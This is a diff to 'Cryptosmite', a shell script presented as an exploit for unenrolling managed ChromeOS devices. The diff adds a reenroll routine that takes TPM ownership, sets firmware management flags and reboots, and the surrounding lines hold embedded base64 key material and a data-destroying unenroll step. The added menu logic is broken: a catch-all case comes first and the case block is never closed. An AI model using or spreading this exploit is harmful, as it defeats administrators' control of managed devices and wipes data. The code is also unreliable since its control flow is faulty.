@@ -66,6 +66,15 @@ key_crosencstateful() {
 EOF
 }
 
+reenroll() {
+tpm_manager_client take_ownership
+cryptohome --action=set_firmware_management_parameters --flags=0x01
+echo "Reenrolled. Powerwash to take effect."
+echo "Rebooting in 3 seconds"
+time 3
+reboot
+}
+
 key_ecryptfs() {
 	cat <<EOF | base64 -d
 p2/YL2slzb2JoRWCMaGRl1W0gyhUjNQirmq8qzMN4Do=
@@ -88,6 +97,11 @@ clear
 echo "Welcome to Cryptosmite."
 echo "Script date: ${SCRIPT_DATE}"
 echo ""
+echo "Would you like to Reenroll(r) or Unenroll? (u)"
+read -r action1
+case "$action1" in
+        *) reenroll ;;
+        [uU]) : ;;
 echo "This will destroy all data on ${TARGET_PART} and unenroll the device."
 echo "Note that this exploit is patched on some release of ChromeOS r120 and LTS r114."
 echo "Continue? (y/N)"
